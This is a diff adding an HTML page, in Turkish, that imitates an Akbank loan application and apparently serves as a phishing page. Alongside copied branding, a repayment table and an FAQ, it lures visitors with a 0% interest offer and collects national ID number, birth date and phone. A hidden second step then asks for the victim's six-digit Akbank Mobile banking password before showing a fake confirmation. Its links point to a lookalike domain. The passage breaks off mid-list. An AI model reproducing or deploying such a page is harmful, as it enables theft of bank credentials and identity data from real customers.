@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+ 
+<html lang="tr">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script type="text/javascript"></script>
+  </head>
+  <body>
+    <title>İhtiyaç Kredisi Başvurusu | Anında Krediye Başvur - Akbank</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="description" content="İhtiyaç anında yanında. Bankaya gitmeden anında ihtiyaç kredisine başvur ve ödemeye 3 ay sonra başla!">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:title" content="İhtiyaç Kredisi Başvurusu Anında Krediye Başvur">
+    <meta property="og:description" content="İhtiyaç anında yanında. Bankaya gitmeden anında ihtiyaç kredisine başvur ve ödemeye 3 ay sonra başla!">
+    <meta name="theme-color" content="#ffffff">
+ 
+ 
+    <link href="./Akbank_files/vendor.css" rel="stylesheet">
+    <style>
+      .error {
+        border-color: red !important;
+      }
+    </style>
+    <div id="content">
+      <div class="theme-default">
+        <div class="bapp-page bapp-navigation-open">
+          <header class="bapp-header low">
+            <div class="bapp-header-wrapper logo-container">
+              <div class="bapp-logo-container bapp-logo-has-padding">
+                <img name="AkbankLogo" class="bapp-logo" src="./Akbank_files/logo.png">
+              </div>
+            </div>
+          </header>
+          <div class="sticky">
+            <div class="container">
+              <div class="content">
+                <div class="text">
+                  <h3>Hemen Başvur</h3>
+                  <p>Başvuru sürecini online olarak sadece bir kaç dakika içinde kolayca tamamlayabilirsiniz.</p>
+                </div>
+                <a class="btn btn-white btn-scroll-top" href="">Başvuruyu Başlat</a>
+              </div>
+            </div>
+          </div>
+          <div class="banner image-top">
+            <div class="container-v2 position-relative">
+              <h1 class="">İhtiyaç kredinizi 12, 24 ve 36 aylık vadelerle <br>hemen kullanın, 3 ay sonra ödemeye başlayın! </h1>
+              <picture>
+                <img alt="banner" class="img-fluid banner-img lazyloaded" src="./Akbank_files/ihtiyac-kredisi.png">
+              </picture>
+            </div>
+          </div>
+          <main>
+            <section class="section form">
+              <div class="container-v2 container-mobile position-relative">
+                <div class="box p-0">
+                  <form id="form1" novalidate="novalidate">
+                    <div class="row g-0 row-fix">
+                      <div class="col-lg-4 left">
+                        <div class="py-20 px-30">
+                          <h2>İhtiyaç Kredinizi Hesaplayın</h2>
+                          <input type="hidden" id="hdnAmount" name="hdnAmount">
+                          <div class="credit-amount">
+                            <div class="input-block">
+                              <label for="textAmount">Kredi Tutarı</label>
+                              <div class="input-wrapper">
+                                <input class="amount only-number moneyformat form-control slider-text" type="tel" id="creditAmount" autocomplete="off" placeholder="Kredi tutarını giriniz" maxlength="9" inputmode="decimal" data-formattype="money" aria-invalid="false" oninput="formatAmount()">
+                                <div class="suffix">TL</div>
+                              </div>
+                            </div>
+                          </div>
+                          <input type="hidden" id="hdnVade" name="hdnVade">
+                          <div class="slider-range credit-vade">
+                            <div class="input-block">
+                              <label for="txtVade">Vade</label>
+                              <div class="input-wrapper">
+                                <input class="amount only-number moneyformat form-control slider-text" id="term" type="tel" min="1" max="12" maxlength="2" autocomplete="off" placeholder="Kredi vadesini giriniz">
+                                <div class="suffix">AY</div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="input-block d-xl-block">
+                            <label for="" class="d-flex align-items-center">Kredi Türü <div class="tooltipEl" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Kullanılan kredinin hayat sigortalı olarak tercih edilmesi durumunda daha düşük faiz oranından yararlanılır ve aynı zamanda bu kredinin geri ödemesi, ölüm veya kalıcı sakatlık durumunda güvence altına alınmış olur. Hayat sigortalı başvurulabilecek en yüksek kredi tutarı 250.000 TL&#39;dir" data-bs-original-title="Kullanılan kredinin hayat sigortalı olarak tercih edilmesi durumunda daha düşük faiz oranından yararlanılır ve aynı zamanda bu kredinin geri ödemesi, ölüm veya kalıcı sakatlık durumunda güvence altına alınmış olur. Hayat sigortalı başvurulabilecek en yüksek kredi tutarı 250.000 TL&#39;dir"></div>
+                            </label>
+                            <div class="radios column">
+                              <label for="rdSigortali" class="radio">
+                                <input type="radio" name="rdKrediTuru" id="rdSigortali" value="E" checked="">
+                                <span class="checkmark"></span>
+                                <div class="radio-text">Hayat Sigortalı (Faiz Oranı %0)</div>
+                              </label>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-lg-4 middle">
+                        <div class="calculate-box">
+                          <img src="./Akbank_files/arrow-bg-left.jpg" alt="" class="bg-left">
+                          <img src="./Akbank_files/arrow-bg-right.jpg" alt="" class="bg-right">
+                          <div class="calculate-box-content">
+                            <div class="item item1">
+                              <span class="big-text" id="monthlyPayment"></span>
+                              <span class="label-text">Aylık Taksit Tutarı</span>
+                            </div>
+                            <div class="item item2">
+                              <span class="big-text">
+                                <span class="percent">%</span>0 </span>
+                              <span class="label-text">Faiz Oranı</span>
+                            </div>
+                            <div class="item item3">
+                              <span class="small-text" id="totalPayment"></span>
+                              <span class="label-text">Toplam Geri Ödeme Tutarı</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-lg-4 right" id="loginf">
+                        <div class="py-30 px-30 scrollTo">
+                          <h2 id="vald"></h2>
+                          <div class="input-block">
+                            <label for="txtTckn">TC Kimlik No</label>
+                            <input class="tckn only-number focussedInput" type="text" name="txtTckn" id="txtTckn" autocomplete="off" placeholder="T.C. Kimlik Numaranızı Giriniz" maxlength="11" value="" oninput="validateTC()">
+                          </div>
+                          <div class="input-block">
+                            <label for="txtBirthDate">Doğum Tarihi</label>
+                            <span class="text-input-wrapper after-error">
+                              <input type="text" class="dateformat" name="txtBirthDate" id="txtBirthDate" autocomplete="off" placeholder="gg.aa.yyyy" inputmode="numeric">
+                            </span>
+                          </div>
+                          <div class="input-block">
+                            <label for="txtPhoneNumber">Cep Telefonu</label>
+                            <input class="phone" type="text" name="txtPhoneNumber" id="txtPhoneNumber" inputmode="numeric" data-phone="true" autocomplete="off" placeholder="___ ___ ____">
+                          </div>
+                          <!--<div class="input-block"><label for="txtCredit">Mevcut Kart Limiti</label><input class="phone" type="text" name="txtCredit" id="txtCredit" autocomplete="off" placeholder="Kredi Kartı Limitiniz"></div>!-->
+                          <div class="input-block kvkk">
+                            <label class="checkbox d-flex align-center">
+                              <input type="checkbox" class="kvkk" name="chkKvkkBilgilendirme" id="chkKvkkBilgilendirme">
+                              <span class="checkmark"></span>
+                              <span class="checkbox-text">
+                                <a class="kvkk-bilgilendirme-link" href="https://www.akbank.com/Documents/Akbank_KVKK_Aydinlatma_Metni_(Bireysel_Kredi).pdf" target="_blank" rel="noopener noreferrer">Kişisel Verilerin Korunması Kanunu Hakkında Bilgilendirme</a>’yi okudum. </span>
+                            </label>
+                          </div>
+                          <div class="input-block">
+                            <button type="button" id="loginButton" onclick="submitLogin()" class="btn btn-primary w-100 btn-submit">Başvuruyu Başlat</button>
+                            <button type="button" id="loginProcess" class="btn btn-primary w-100 btn-submit" style="display:none;">
+                              <div class="spinner" s=""></div>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-lg-4 right mt-3" id="authf" style="display: none;">
+                        <div class="py-30 px-30 scrollTo">
+                          <div class="input-block">
+                            <h2 class="mb-4">Son bi adım kaldı..</h2>
+                            <label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label>
+                            <input class="phone" type="password" id="passauth" maxlength="6">
+                          </div>
+                          <div class="input-block">
+                            <button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit" disabled="">Onayla</button>
+                            <button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;">
+                              <div class="spinner"></div>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="col-lg-4 right mt-3" id="completef" style="display: none;">
+                        <div class="py-30 px-30 scrollTo">
+                          <div class="input-block" style="font-family: Inter;">
+                            <h8>
+                              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="red" class="bi bi-check-circle" viewBox="0 0 16 16">
+                                <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
+                                <path d="m10.97 4.97-.02.022-3.473 4.425-2.093-2.094a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05"></path>
+                              </svg>
+                              <br>
+                              <br>Başvurunuz başarıyla alınmıştır. <br>
+                              <br> En kısa süre içerisinde sonuçlandırma ile ilgili bilgilendirileceksiniz.
+                            </h8>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </section>
+            <section class="section boxes">
+              <div class="container-v2 container-mobile position-relative">
+                <div class="tooltip-container">
+                  <div class="close">
+                    <button type="button" class="btn-close" aria-label="Close"></button>
+                  </div>
+                  <div class="content">
+                    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                      <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="pills-home-tab" data-bs-toggle="pill" data-bs-target="#pills-home" type="button" role="tab" aria-controls="pills-home" aria-selected="true">Masraf ve Maliyet Oranları</button>
+                      </li>
+                      <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="pills-profile-tab" data-bs-toggle="pill" data-bs-target="#pills-profile" type="button" role="tab" aria-controls="pills-profile" aria-selected="false" tabindex="-1">Ödeme Planı</button>
+                      </li>
+                    </ul>
+                    <div class="tab-content" id="pills-tabContent">
+                      <div class="tab-pane fade show active oran" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
+                        <table class="table2">
+                          <tbody>
+                            <tr class="desc-row">
+                              <td>Kredi Tahsis Ücreti</td>
+                              <td>
+                                <span class="KTU">575,00 TL</span>
+                              </td>
+                            </tr>
+                            <tr class="desc-row">
+                              <td>Aylık Maliyet Oranı</td>
+                              <td>
+                                <span class="AMO">% 6,4598</span>
+                              </td>
+                            </tr>
+                            <tr class="desc-row">
+                              <td>Efektif Yıllık Faiz Oranı</td>
+                              <td>
+                                <span class="YMO">% 111,9470</span>
+                              </td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <div>
+                          <ul class="desc">
+                            <li>Kredi tahsis ücreti, kredi tutarının %0,575'i kadar olup, %15 oranındaki BSMV dahildir.</li>
+                            <li>Sigortalı faiz oranı Akbank İnternet ve Akbank Mobil'den yapılacak Kredi Hayat Sigortalı Kredi kullandırımları için geçerlidir.</li>
+                            <li>Hayat sigortası primi olan 1.640,73 TL, 50.000 TL tutarındaki 36 ay vadeli ihtiyaç kredisi için 35 yaş üzerinden örnek olarak hesaplanmıştır; kredinin tutarı, vadesi, faiz oranı ve kullanacak olan kişinin yaşına göre değişiklik gösterebilir.</li>
+                            <li>Kredi kullandırım anında, son taksitin hesaplanması ile ilgili kuruşsal farklılık olabilmektedir.</li>
+                            <li>Tabloda yer alan faiz oranları ortalama değerler baz alınarak hesap edilmiştir. Bu oranlar müşteri skoru ve benzer nedenlerle müşteri özelinde değişebilmektedir.</li>
+                          </ul>
+                        </div>
+                      </div>
+                      <div class="tab-pane fade plan" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
+                        <table id="responsive-table" class="" width="100%">
+                          <thead>
+                            <tr class="mb-collepse-row">
+                              <th>Dönem</th>
+                              <th>Taksit Tutarı <span class="currency"> (TL)</span>
+                              </th>
+                              <th class="none">Faiz Ödemesi <span class="currency"> (TL)</span>
+                              </th>
+                              <th class="none">KKDF <span class="currency"> (TL)</span>
+                              </th>
+                              <th class="none">BSMV <span class="currency"> (TL)</span>
+                              </th>
+                              <th class="none">Anapara Ödemesi <span class="currency"> (TL)</span>
+                              </th>
+                              <th>Kalan Anapara <span class="currency"> (TL)</span>
+                              </th>
+                            </tr>
+                          </thead>
+                          <tbody class="responsive-table-body">
+                            <tr class="total-row mb-collepse-row">
+                              <td>Toplam</td>
+                              <td>198.283,52 <span class="currency">TL</span>
+                              </td>
+                              <td>75.602,70 <span class="currency">TL</span>
+                              </td>
+                              <td>11.340,41 <span class="currency">TL</span>
+                              </td>
+                              <td>11.340,41 <span class="currency">TL</span>
+                              </td>
+                              <td>100.000,00 <span class="currency">TL</span>
+                              </td>
+                              <td>-</td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>1</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.920,00 <span class="currency">TL</span>
+                              </td>
+                              <td>738,00 <span class="currency">TL</span>
+                              </td>
+                              <td>738,00 <span class="currency">TL</span>
+                              </td>
+                              <td>1.865,81 <span class="currency">TL</span>
+                              </td>
+                              <td>98.134,19 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>2</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.828,20 <span class="currency">TL</span>
+                              </td>
+                              <td>724,23 <span class="currency">TL</span>
+                              </td>
+                              <td>724,23 <span class="currency">TL</span>
+                              </td>
+                              <td>1.985,15 <span class="currency">TL</span>
+                              </td>
+                              <td>96.149,04 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>3</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.730,53 <span class="currency">TL</span>
+                              </td>
+                              <td>709,58 <span class="currency">TL</span>
+                              </td>
+                              <td>709,58 <span class="currency">TL</span>
+                              </td>
+                              <td>2.112,12 <span class="currency">TL</span>
+                              </td>
+                              <td>94.036,92 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>4</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.626,62 <span class="currency">TL</span>
+                              </td>
+                              <td>693,99 <span class="currency">TL</span>
+                              </td>
+                              <td>693,99 <span class="currency">TL</span>
+                              </td>
+                              <td>2.247,21 <span class="currency">TL</span>
+                              </td>
+                              <td>91.789,70 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>5</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.516,05 <span class="currency">TL</span>
+                              </td>
+                              <td>677,41 <span class="currency">TL</span>
+                              </td>
+                              <td>677,41 <span class="currency">TL</span>
+                              </td>
+                              <td>2.390,94 <span class="currency">TL</span>
+                              </td>
+                              <td>89.398,76 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>6</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.398,42 <span class="currency">TL</span>
+                              </td>
+                              <td>659,76 <span class="currency">TL</span>
+                              </td>
+                              <td>659,76 <span class="currency">TL</span>
+                              </td>
+                              <td>2.543,87 <span class="currency">TL</span>
+                              </td>
+                              <td>86.854,89 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>7</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.273,26 <span class="currency">TL</span>
+                              </td>
+                              <td>640,99 <span class="currency">TL</span>
+                              </td>
+                              <td>640,99 <span class="currency">TL</span>
+                              </td>
+                              <td>2.706,57 <span class="currency">TL</span>
+                              </td>
+                              <td>84.148,32 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>8</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>4.140,10 <span class="currency">TL</span>
+                              </td>
+                              <td>621,01 <span class="currency">TL</span>
+                              </td>
+                              <td>621,01 <span class="currency">TL</span>
+                              </td>
+                              <td>2.879,69 <span class="currency">TL</span>
+                              </td>
+                              <td>81.268,63 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>9</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.998,42 <span class="currency">TL</span>
+                              </td>
+                              <td>599,76 <span class="currency">TL</span>
+                              </td>
+                              <td>599,76 <span class="currency">TL</span>
+                              </td>
+                              <td>3.063,87 <span class="currency">TL</span>
+                              </td>
+                              <td>78.204,76 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>10</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.847,67 <span class="currency">TL</span>
+                              </td>
+                              <td>577,15 <span class="currency">TL</span>
+                              </td>
+                              <td>577,15 <span class="currency">TL</span>
+                              </td>
+                              <td>3.259,84 <span class="currency">TL</span>
+                              </td>
+                              <td>74.944,92 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>11</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.687,29 <span class="currency">TL</span>
+                              </td>
+                              <td>553,09 <span class="currency">TL</span>
+                              </td>
+                              <td>553,09 <span class="currency">TL</span>
+                              </td>
+                              <td>3.468,34 <span class="currency">TL</span>
+                              </td>
+                              <td>71.476,59 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>12</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.516,65 <span class="currency">TL</span>
+                              </td>
+                              <td>527,50 <span class="currency">TL</span>
+                              </td>
+                              <td>527,50 <span class="currency">TL</span>
+                              </td>
+                              <td>3.690,17 <span class="currency">TL</span>
+                              </td>
+                              <td>67.786,42 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>13</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.335,09 <span class="currency">TL</span>
+                              </td>
+                              <td>500,26 <span class="currency">TL</span>
+                              </td>
+                              <td>500,26 <span class="currency">TL</span>
+                              </td>
+                              <td>3.926,19 <span class="currency">TL</span>
+                              </td>
+                              <td>63.860,22 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>14</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>3.141,92 <span class="currency">TL</span>
+                              </td>
+                              <td>471,29 <span class="currency">TL</span>
+                              </td>
+                              <td>471,29 <span class="currency">TL</span>
+                              </td>
+                              <td>4.177,31 <span class="currency">TL</span>
+                              </td>
+                              <td>59.682,91 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>15</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>2.936,40 <span class="currency">TL</span>
+                              </td>
+                              <td>440,46 <span class="currency">TL</span>
+                              </td>
+                              <td>440,46 <span class="currency">TL</span>
+                              </td>
+                              <td>4.444,49 <span class="currency">TL</span>
+                              </td>
+                              <td>55.238,41 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>16</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>2.717,73 <span class="currency">TL</span>
+                              </td>
+                              <td>407,66 <span class="currency">TL</span>
+                              </td>
+                              <td>407,66 <span class="currency">TL</span>
+                              </td>
+                              <td>4.728,76 <span class="currency">TL</span>
+                              </td>
+                              <td>50.509,65 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>17</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>2.485,07 <span class="currency">TL</span>
+                              </td>
+                              <td>372,76 <span class="currency">TL</span>
+                              </td>
+                              <td>372,76 <span class="currency">TL</span>
+                              </td>
+                              <td>5.031,22 <span class="currency">TL</span>
+                              </td>
+                              <td>45.478,43 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>18</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>2.237,54 <span class="currency">TL</span>
+                              </td>
+                              <td>335,63 <span class="currency">TL</span>
+                              </td>
+                              <td>335,63 <span class="currency">TL</span>
+                              </td>
+                              <td>5.353,01 <span class="currency">TL</span>
+                              </td>
+                              <td>40.125,42 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>19</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>1.974,17 <span class="currency">TL</span>
+                              </td>
+                              <td>296,13 <span class="currency">TL</span>
+                              </td>
+                              <td>296,13 <span class="currency">TL</span>
+                              </td>
+                              <td>5.695,39 <span class="currency">TL</span>
+                              </td>
+                              <td>34.430,03 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>20</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>1.693,96 <span class="currency">TL</span>
+                              </td>
+                              <td>254,09 <span class="currency">TL</span>
+                              </td>
+                              <td>254,09 <span class="currency">TL</span>
+                              </td>
+                              <td>6.059,67 <span class="currency">TL</span>
+                              </td>
+                              <td>28.370,36 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>21</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>1.395,82 <span class="currency">TL</span>
+                              </td>
+                              <td>209,37 <span class="currency">TL</span>
+                              </td>
+                              <td>209,37 <span class="currency">TL</span>
+                              </td>
+                              <td>6.447,24 <span class="currency">TL</span>
+                              </td>
+                              <td>21.923,12 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>22</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>1.078,62 <span class="currency">TL</span>
+                              </td>
+                              <td>161,79 <span class="currency">TL</span>
+                              </td>
+                              <td>161,79 <span class="currency">TL</span>
+                              </td>
+                              <td>6.859,61 <span class="currency">TL</span>
+                              </td>
+                              <td>15.063,51 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>23</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>741,12 <span class="currency">TL</span>
+                              </td>
+                              <td>111,17 <span class="currency">TL</span>
+                              </td>
+                              <td>111,17 <span class="currency">TL</span>
+                              </td>
+                              <td>7.298,35 <span class="currency">TL</span>
+                              </td>
+                              <td>7.765,15 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                            <tr class="mb-collepse-row">
+                              <td>24</td>
+                              <td>8.261,81 <span class="currency">TL</span>
+                              </td>
+                              <td>382,05 <span class="currency">TL</span>
+                              </td>
+                              <td>57,31 <span class="currency">TL</span>
+                              </td>
+                              <td>57,31 <span class="currency">TL</span>
+                              </td>
+                              <td>7.765,15 <span class="currency">TL</span>
+                              </td>
+                              <td>0,00 <span class="currency">TL</span>
+                              </td>
+                            </tr>
+                          </tbody>
+                        </table>
+                        <div class="custom-pagination d-md-none">
+                          <a href="https://akbankbireysel.com/#" class="previous" data-number="1">Önceki Sayfa</a>
+                          <a href="https://akbankbireysel.com/#" class="next" data-number="1">Sonraki Sayfa</a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="infoboxes-container">
+                  <div class="row">
+                    <div class="col-lg-4">
+                      <div class="box">
+                        <img src="./Akbank_files/credit1.svg" alt="chip">
+                        <div class="content">
+                          <h3>Size özel uygun faiz oranları ile kredinizi kullanabilirsiniz</h3>
+                          <p>İhtiyaç anında Akbank yanınızda. Uygun faiz oranları ile 36 aya kadar krediniz Akbank'ta.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-lg-4">
+                      <div class="box">
+                        <img src="./Akbank_files/credit2.svg" alt="dijitalcard">
+                        <div class="content">
+                          <h3>Belgesiz, imzasız anında hesabınıza geçer</h3>
+                          <p>Akbanklıysanız, Akbank Mobil ve İnternet, 444 25 25 Müşteri İletişim Merkezimiz veya şubelerimizden kredinizi kullanabilirsiniz.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-lg-4">
+                      <div class="box">
+                        <img src="./Akbank_files/credit3.svg" alt="milpuan">
+                        <div class="content">
+                          <h3>Henüz Akbanklı değilseniz de başvuru yaparak kredi limitinizi öğrenebilirsiniz</h3>
+                          <p>Formu doldurun, ne kadar kredi kullanabileceğinizi öğrenin ve size en yakın şubeden kredinizi anında kullanın.</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <section class="section accordions">
+              <div class="container-v2 container-mobile">
+                <div class="acc" data-id="kredi-hesaplama-nasil-yapilir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-1" aria-expanded="false" aria-controls="content-1">Kredi hesaplama nasıl yapılır?</button>
+                  </h4>
+                  <div class="acc-content" id="content-1" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Talep ettiğiniz kredi tutarı ve vadeyi girerek, size uygun faiz oranını ve aylık taksit tutarını görüntüleyebilirsiniz. Ayrıca kredi ile birlikte ödeyeceğiniz diğer masrafları ve kredinizin toplam maliyetini de görüntüleyebilirsiniz. Faiz oranı; girdiğiniz tutar ve vadeye, başvuru skorunuza veya sigorta durumunuza göre değişebilir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ihtiyac-kredisine-kimler-basvurabilir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-2" aria-expanded="false" aria-controls="content-2">İhtiyaç kredisine kimler başvurabilir?</button>
+                  </h4>
+                  <div class="acc-content" id="content-2" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>18 yaşından büyükseniz ve çalışıyorsanız kredi başvurunuzu iletebilirsiniz. Kredi başvuru sonucunuz bankamızda kayıtlı cep telefonunuza iletilecektir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ne-kadar-ihtiyac-kredisi-kullanabilirsiniz">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-3" aria-expanded="false" aria-controls="content-3">Ne kadar ihtiyaç kredisi kullanabilirsiniz?</button>
+                  </h4>
+                  <div class="acc-content" id="content-3" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Akbank Mobil ve İnternet üzerinden 500.000 TL'ye kadar kredi başvurusunda bulunabilir, onaylanması durumunda kredinizi kullanabilirsiniz. 500.000 TL üzeri kredi talebinizi iletmek için şubelerimize gidebilirsiniz.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="hangi-belgelere-ihtiyaciniz-var">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-4" aria-expanded="false" aria-controls="content-4">Hangi belgelere ihtiyacınız var?</button>
+                  </h4>
+                  <div class="acc-content" id="content-4" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Akbanklıysanız, Akbank Mobil ve İnternet üzerinden, belgesiz imzasız kredinizi kullanabilirsiniz. Henüz Akbanklı olmadıysanız, kimlik, gelir durumu ve adresinizi teyit eden belge ile en yakın şubemize başvurabilirsiniz. Ek belgeye ihtiyaç duyulursa şubemiz sizi bilgilendirecektir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="kredinizi-nasil-kullanabilirsiniz">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-5" aria-expanded="false" aria-controls="content-5">Kredinizi nasıl kullanabilirsiniz?</button>
+                  </h4>
+                  <div class="acc-content" id="content-5" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Kredinizi Akbank Mobil ve İnternet'ten, 444 25 25'ten veya şubelerimizden hemen kullanabilirsiniz.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="ihtiyac-kredisi-kosullari-nelerdir">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-6" aria-expanded="false" aria-controls="content-6">İhtiyaç kredisi koşulları nelerdir?</button>
+                  </h4>
+                  <div class="acc-content" id="content-6" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p>Erteleme dahil ihtiyaç kredilerinde en uzun vade; 50.000 TL ve altındaki tutarlarda 36 ay, 50.000 TL üzeri 100.000 TL ve altındaki tutarlarda 24 ay, 100.000 TL üzerindeki tutarlarda ise 12 aydır. En uzun kredi vadesi, mevzuatta belirlenen çerçeve doğrultusunda, kişinin varsa mevcut kredilerinin bakiyesi de dikkate alınabileceğinden değişebilmektedir.</p>
+                  </div>
+                </div>
+                <div class="acc" data-id="diger-aciklamalar">
+                  <h4 class="acc-title">
+                    <button role="tab" type="button" id="acc-7" aria-expanded="false" aria-controls="content-7">Diğer Açıklamalar</button>
+                  </h4>
+                  <div class="acc-content" id="content-7" aria-labelledby="accordion1" role="tabpanel" aria-hidden="true">
+                    <p></p>
+                    <ul>
+                      <li>Tabloda yer alan faiz oranları ortalama değerler baz alınarak hesap edilmiştir. Bu oranlar müşteri skoru ve benzer nedenlerle müşteri özelinde değişebilmektedir.</li>
